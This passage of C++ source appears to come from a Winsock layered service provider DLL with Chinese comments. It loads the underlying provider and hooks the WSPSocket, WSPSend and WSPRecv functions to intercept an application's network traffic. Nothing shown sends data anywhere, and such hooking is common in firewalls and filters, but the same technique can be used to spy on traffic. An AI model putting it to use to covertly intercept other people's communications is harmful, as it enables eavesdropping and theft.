		LOG1(L" WSPStartup:  ExpandEnvironmentStrings() failed %d \n", ::GetLastError());
		return WSAEPROVIDERFAILEDINIT;
	}
	// 加载下层提供程序
	HMODULE hModule = ::LoadLibrary(szBaseProviderDll);
	if(hModule == NULL)
	{
		LOG1(L" WSPStartup:  LoadLibrary() failed %d \n", ::GetLastError());
		return WSAEPROVIDERFAILEDINIT;
	}

	// 导入下层提供程序的WSPStartup函数
	LPWSPSTARTUP  pfnWSPStartup = NULL;
	pfnWSPStartup = (LPWSPSTARTUP)::GetProcAddress(hModule, "WSPStartup");
	if(pfnWSPStartup == NULL)
	{
		LOG1(L" WSPStartup:  GetProcAddress() failed %d \n", ::GetLastError());
		return WSAEPROVIDERFAILEDINIT;
	}

	// 调用下层提供程序的WSPStartup函数
	LPWSAPROTOCOL_INFOW pInfo = lpProtocolInfo;
	if(NextProtocolInfo.ProtocolChain.ChainLen == BASE_PROTOCOL)
		pInfo = &NextProtocolInfo;

	int nRet = pfnWSPStartup(wVersionRequested, lpWSPData, pInfo, UpcallTable, lpProcTable);
	if(nRet != ERROR_SUCCESS)
	{
		LOG1(L" WSPStartup:  underlying provider's WSPStartup() failed %d \n", nRet);
		return nRet;
	}

	// 保存下层提供者的函数表
	g_NextProcTable = *lpProcTable;

	// 修改传递给上层的函数表，Hook感兴趣的函数
	/*lpProcTable->lpWSPAsyncSelect = WSPAsyncSelect;
	lpProcTable->lpWSPCancelBlockingCall;
	lpProcTable->lpWSPCleanup = WSPCleanup;
	lpProcTable->lpWSPDuplicateSocket = WSPDuplicateSocket;
	lpProcTable->lpWSPEnumNetworkEvents = WSPEnumNetworkEvents;
	lpProcTable->lpWSPEventSelect = WSPEventSelect;
	lpProcTable->lpWSPGetPeerName = WSPGetPeerName;
	lpProcTable->lpWSPGetQOSByName = WSPGetQOSByName;
	lpProcTable->lpWSPJoinLeaf = WSPJoinLeaf;
	lpProcTable->lpWSPListen = WSPListen;
	lpProcTable->lpWSPRecvDisconnect = WSPRecvDisconnect;
	lpProcTable->lpWSPRecvFrom = WSPRecvFrom;
	lpProcTable->lpWSPSendDisconnect = WSPSendDisconnect;
	lpProcTable->lpWSPSendTo = WSPSendTo;
	lpProcTable->lpWSPStringToAddress = WSPStringToAddress; 
	lpProcTable->lpWSPAccept = WSPAccept;*/

	/*lpProcTable->lpWSPAddressToString = WSPAddressToString;
	lpProcTable->lpWSPBind = WSPBind;
	lpProcTable->lpWSPConnect = WSPConnect;
	lpProcTable->lpWSPCloseSocket = WSPCloseSocket;
	lpProcTable->lpWSPGetSockName = WSPGetSockName;
	lpProcTable->lpWSPGetSockOpt = WSPGetSockOpt;
	lpProcTable->lpWSPIoctl = WSPIoctl;
	lpProcTable->lpWSPSelect = WSPSelect;
	lpProcTable->lpWSPSetSockOpt = WSPSetSockOpt;
	lpProcTable->lpWSPShutdown = WSPShutdown;
	lpProcTable->lpWSPGetOverlappedResult = WSPGetOverlappedResult;*/
	
	
	lpProcTable->lpWSPSocket = WSPSocket;
	lpProcTable->lpWSPSend = WSPSend;
	lpProcTable->lpWSPRecv = WSPRecv;

	FreeProvider(pProtoInfo);

	//创建CompletionPort
	g_hShutdownEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	g_hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
	/*if (!g_hCompletionPort)
	{
		LOG(TEXT("g_hCompletionPort Create Failed\n"));
		return 0;
	}

	if (!CreateWorkers())
	{
		LOG(TEXT("Error condition @CreateWorkers, exiting\n"));
		return 0;
	}*/

	return nRet;
}
